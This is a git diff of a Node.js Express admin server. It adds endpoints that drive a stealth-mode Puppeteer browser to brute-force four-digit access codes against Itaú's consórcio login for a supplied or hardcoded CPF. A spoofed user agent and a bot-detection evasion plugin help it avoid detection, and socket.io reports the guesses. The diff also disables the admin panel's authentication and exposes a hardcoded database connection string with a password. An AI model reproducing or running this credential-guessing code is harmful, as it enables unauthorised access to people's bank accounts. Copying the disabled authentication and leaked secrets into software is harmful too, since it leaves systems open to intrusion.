@@ -12,6 +12,7 @@ const apiTK = express()
 const apiExport = express()
 const apiCotas = express()
 const apiEmbracon = express()
+const apiServopa = express()
 const fs = require('fs');
 
 const AdminJSMongoose = require('@adminjs/mongoose')
@@ -21,7 +22,7 @@ let tokenLocal;
 
 
 
-const run = async () => {
+/*const run = async () => {
   await mongoose.connect('mongodb+srv://appconsorcio:40464586828@cluster0.jvr8z.mongodb.net/usuarios?retryWrites=true&w=majority', {
     useNewUrlParser: true,
     useUnifiedTopology: true,
@@ -33,17 +34,17 @@ const User = mongoose.model('User', {
   password: { type: String, required: true },
   email: { type: String, required: true },
   acesso: { type: String, enum: ['Admin', 'Operacional'], required: true },
-})
+})*/
 
 
-const podeEditarUsuarios = ({ currentAdmin }) => currentAdmin && currentAdmin.acesso === 'Admin'
+//const podeEditarUsuarios = ({ currentAdmin }) => currentAdmin && currentAdmin.acesso === 'Admin'
 
 AdminJS.registerAdapter(AdminJSMongoose)
 
 const adminJS = new AdminJS({
   rootPath: '/admin',
 
-  resources: [
+  /*resources: [
     {
       resource: User,
       options: {
@@ -84,18 +85,7 @@ const adminJS = new AdminJS({
 
       }
     }
-  ],
-
-
-
-   pages: {
-     Ademicon: {
-       component: AdminJS.bundle('./src/components/ademicon'),
-     },
-     Scania: {
-      component: AdminJS.bundle('./src/components/scania'),
-    }
-   },
+  ],*/
 
   branding: {
     companyName: 'Consórcios',
@@ -103,8 +93,8 @@ const adminJS = new AdminJS({
     //logo: 'https://www.quisto.com.br/wp-content/uploads/2021/05/quisto-seguro-consorcio-banner-1-1024x576.png',
     softwareBrothers: false,
   },
-    dashboard: {
-    component: AdminJS.bundle('./src/components/dashboard'),
+  dashboard: {
+    component: AdminJS.bundle('./src/components/ademicon'),
   },
   locale: {
     translations: {
@@ -193,7 +183,9 @@ const adminJS = new AdminJS({
   }
 })
 
-//const router = AdminJSExpressjs.buildRouter(adminJS)
+const router = AdminJSExpressjs.buildRouter(adminJS)
+
+/*
 const router = AdminJSExpressjs.buildAuthenticatedRouter(adminJS, {
   authenticate: async (email, senha) => {
     const user = await User.findOne({ email })
@@ -207,7 +199,7 @@ const router = AdminJSExpressjs.buildAuthenticatedRouter(adminJS, {
   },
   cookiePassword: 'some-secret-password-used-to-secure-cookie',
 })
-
+*/
 
 /*
 const router = AdminJSExpressjs.buildAuthenticatedRouter(adminJS, {
@@ -247,11 +239,283 @@ apiEmbracon.use(bodyParser.urlencoded({ extended: false }))
 apiEmbracon.use(express.json())
 apiEmbracon.use(cors())
 
+apiServopa.use(morgan('dev'))
+apiServopa.use(bodyParser.urlencoded({ extended: false }))
+apiServopa.use(express.json())
+apiServopa.use(cors())
 
 app.listen(9999, () => console.log('Sistema rodando localhost:9999/admin'))
 apiTK.listen(8081, () => console.log('API pega token rodando localhost:8081'))
 apiExport.listen(8082, () => console.log('API exporta token rodando localhost:8082'))
 apiEmbracon.listen(8083, () => console.log('API exporta token embracon localhost:8083'))
+apiServopa.listen(8084, () => console.log('API exporta token embracon localhost:8083'))
+
+
+const puppeteer = require('puppeteer-extra');
+//07977812770
+
+// Definição da rota para automatização
+apiServopa.get('/', async (req, res) => {
+  try {
+    const browser = await puppeteer.launch({
+      headless: false,
+      args: [
+        "--no-sandbox",
+        "--disable-setuid-sandbox",
+        "--start-maximized",
+        "--disable-dev-shm-usage"
+      ],
+      defaultViewport: null,
+      timeout: 60000 // Aumentando o timeout para 60 segundos
+    });
+    
+
+    const page = await browser.newPage();
+
+    // Define o User-Agent para simular um navegador real
+    await page.setUserAgent(
+      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+    );
+
+    await page.goto('https://www.itau.com.br/servicos/mais-acessos', { waitUntil: 'networkidle2' });
+
+    // Clica no botão para abrir o modal de login
+    await page.waitForSelector('button[id="open-consorcio-modal"]', { visible: true });
+    await page.evaluate(() => document.querySelector('button[id="open-consorcio-modal"]').click());
+
+    await page.waitForTimeout(500); // Pequeno delay para garantir a abertura do modal
+
+    // Espera pelo campo de CPF e preenche o CPF fornecido
+    await page.waitForSelector('input[id=consorcio-cpf]', { visible: true });
+    await page.type('input[id=consorcio-cpf]', "41811569749", { delay: 300 });
+
+    await page.waitForSelector('input[id=consorcio-codigo-acesso]', { visible: true });
+
+    let found = false; // Flag para verificar se o código foi encontrado
+    let correctCode = ''; // Variável para armazenar o código correto
+  
+    // Monitora novas abas que são abertas
+    let newPage = null;
+    browser.on('targetcreated', async (target) => {
+      if (target.type() === 'page') {
+        newPage = await target.page(); // Nova aba aberta
+        await newPage.bringToFront(); // Traz a nova aba para frente para facilitar a verificação
+      }  
+    });
+
+    // Loop para tentar códigos de 7130 até 9999
+    for (let code = 8825; code <= 9999; code++) {
+      const accessCode = code.toString().padStart(4, '0'); // Gera o código com 4 dígitos (ex.: 0001, 0002)
+
+      // Limpa o campo de código de acesso antes de digitar o próximo valor
+      await page.evaluate(() => document.querySelector('input[id=consorcio-codigo-acesso]').value = '');
+
+      await page.type('input[id=consorcio-codigo-acesso]', accessCode, { delay: 100 });
+
+      console.log(`Tentando código: ${accessCode}`);
+
+      await page.waitForSelector('button.btn-more-access.primary[type="submit"]', { visible: true });
+
+      // Traz o botão para a visualização e clica
+      await page.evaluate(() => document.querySelector('button.btn-more-access.primary[type="submit"]').scrollIntoView());
+
+      // Clica no botão para tentar o login
+      await page.click('button.btn-more-access.primary[type="submit"]');
+
+      // Espera a resposta após o envio (aumente o tempo se necessário)
+      await page.waitForTimeout(3000);
+
+      // Se uma nova aba foi aberta, verifica o resultado
+      if (newPage && !newPage.isClosed()) { // Verifica se a nova aba ainda está aberta
+        console.log(`Nova aba detectada ao tentar o código: ${accessCode}. Verificando conteúdo...`);
+
+        try {
+          // Verifica se o login foi bem-sucedido ou se houve erro
+          const loginResult = await newPage.evaluate(() => {
+            const menuElement = document.querySelector('a.menuatalhoitem[alt="Menu"]'); // Elemento que aparece em caso de sucesso
+            const errorMessage = document.querySelector('span.MsgTxt'); // Mensagem de erro
+            if (menuElement) {
+              return 'success';
+            } else if (errorMessage && errorMessage.innerText.includes('CPF/CNPJ ou senha inválido')) {
+              return 'invalid';
+            } else {
+              return 'unknown';
+            }
+          });
+
+          if (loginResult === 'success') {
+            found = true;
+            correctCode = accessCode;
+            console.log(`Código correto encontrado: ${accessCode} na nova aba`);
+            break;
+          } else if (loginResult === 'invalid') {
+            console.log(`Erro de acesso detectado ao tentar o código: ${accessCode}. Fechando a aba...`);
+            await newPage.close(); // Fecha a nova aba
+            newPage = null; // Reseta o estado da nova aba
+          } else {
+            console.log(`Não foi possível determinar o estado da nova aba com o código: ${accessCode}. Continuando...`);
+          }
+        } catch (error) {
+          console.error(`Erro ao verificar a nova aba para o código: ${accessCode}. Fechando a aba...`);
+          await newPage.close(); // Fecha a nova aba caso haja erro
+          newPage = null; // Reseta o estado da nova aba
+        }
+      }
+    }
+
+    if (found) {
+      res.send(`Código de acesso correto encontrado: ${correctCode}`);
+    } else {
+      res.send('Nenhum código correto encontrado de 7130 até 9999.');
+    }
+
+    await browser.close();
+  } catch (error) {
+    console.error('Erro ao tentar os códigos de acesso:', error);
+    res.status(500).send('Erro ao processar a solicitação');
+  }
+});
+
+// Inicia o servidor na porta 3000
+apiServopa.listen(3000, () => {
+  console.log('API rodando em http://localhost:3000');
+});
+
+
+
+// Permite o uso de JSON no corpo das requisições
+app.use(express.json());
+app.use(cors());
+const http = require('http');
+const StealthPlugin = require('puppeteer-extra-plugin-stealth');
+const socketIO = require('socket.io');
+
+// Ativa o modo stealth
+puppeteer.use(StealthPlugin());
+const server = http.createServer(app);
+const io = socketIO(server);
+// Endpoint para consulta
+app.use(express.json());
+app.use(cors());
+
+app.post('/api/consultar', async (req, res) => {
+  const { cpf, codeStart } = req.body;
+
+  if (!cpf || !codeStart) {
+    return res.status(400).send('CPF e código inicial são obrigatórios');
+  }
+
+  let browser;
+  try {
+    browser = await puppeteer.launch({
+      headless: false, // Para facilitar o debug, o navegador será exibido
+      args: [
+        '--no-sandbox',
+        '--disable-setuid-sandbox',
+        '--start-maximized',
+        '--disable-dev-shm-usage',
+      ],
+      defaultViewport: null,
+    });
+
+    const page = await browser.newPage();
+    await page.setUserAgent(
+      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36'
+    );
+
+    console.log('Acessando página...');
+    await page.goto('https://www.itau.com.br/servicos/mais-acessos', {
+      waitUntil: 'networkidle2',
+    });
+
+    // Aceitar cookies
+    console.log('Aceitando cookies...');
+    try {
+      await page.waitForSelector('button[id="itau-cookie-consent-banner-accept-cookies-btn"]', {
+        visible: true,
+      });
+      await page.click('button[id="itau-cookie-consent-banner-accept-cookies-btn"]');
+      console.log('Cookies aceitos.');
+    } catch (err) {
+      console.warn('Botão de cookies não encontrado. Continuando...');
+    }
+
+    // Abrir modal de login
+    console.log('Abrindo modal de login...');
+    await page.waitForSelector('button[id="open-consorcio-modal"]', { visible: true });
+    await page.click('button[id="open-consorcio-modal"]');
+
+    await page.waitForSelector('input[id=consorcio-cpf]', { visible: true });
+    await page.type('input[id=consorcio-cpf]', cpf, { delay: 200 });
+
+    let found = false;
+    let correctCode = '';
+    const startCode = parseInt(codeStart);
+
+    // Loop para testar códigos
+    console.log('Iniciando loop de tentativas...');
+    for (let code = startCode; code <= 9999; code++) {
+      const accessCode = code.toString().padStart(4, '0');
+      await page.evaluate(() => (document.querySelector('input[id=consorcio-codigo-acesso]').value = ''));
+      await page.type('input[id=consorcio-codigo-acesso]', accessCode, { delay: 150 });
+
+      console.log(`Tentando código: ${accessCode}`);
+      await page.click('button.btn-more-access.primary[type="submit"]');
+      await page.waitForTimeout(3000);
+
+      io.emit('attempt', { code: accessCode, status: 'Tentativa realizada' });
+
+      // Monitorar e fechar abas abertas para códigos inválidos
+      const targets = await browser.targets();
+      const pages = await browser.pages();
+
+      if (pages.length > 1) {
+        const lastPage = pages[pages.length - 1];
+        const loginResult = await lastPage.evaluate(() => {
+          const menuElement = document.querySelector('a.menuatalhoitem[alt="Menu"]');
+          const errorMessage = document.querySelector('span.MsgTxt');
+          if (menuElement) {
+            return 'success';
+          } else if (errorMessage && errorMessage.innerText.includes('CPF/CNPJ ou senha inválido')) {
+            return 'invalid';
+          } else {
+            return 'unknown';
+          }
+        });
+
+        if (loginResult === 'success') {
+          found = true;
+          correctCode = accessCode;
+          io.emit('attempt', { code: accessCode, status: 'Código correto encontrado' });
+          console.log(`Código de acesso correto encontrado: ${correctCode}`);
+          break;
+        }
+
+        // Fechar aba se código for inválido
+        console.log('Fechando aba criada para código inválido...');
+        await lastPage.close();
+      }
+    }
+
+    if (found) {
+      res.send(`Código de acesso correto encontrado: ${correctCode}`);
+    } else {
+      res.send('Nenhum código correto encontrado.');
+    }
+  } catch (error) {
+    console.error('Erro durante o processo:', error.message);
+    res.status(500).send('Erro ao processar a solicitação.');
+  } finally {
+    if (browser) {
+      await browser.close();
+    }
+  }
+});
+
+// Inicialização do servidor
+server.listen(3001, () => {
+  console.log('API rodando na porta 3001');
+});
 
 apiEmbracon.get('/', (req, res) => {
   const cota = req.query.cota
@@ -306,7 +570,6 @@ apiTK.get('/', (req, res) => {
   let apiKey;
   let tk;
   let chave;
-  const puppeteer = require('puppeteer');
   (async () => {
     const browser = await puppeteer.launch({
       //headless: true,
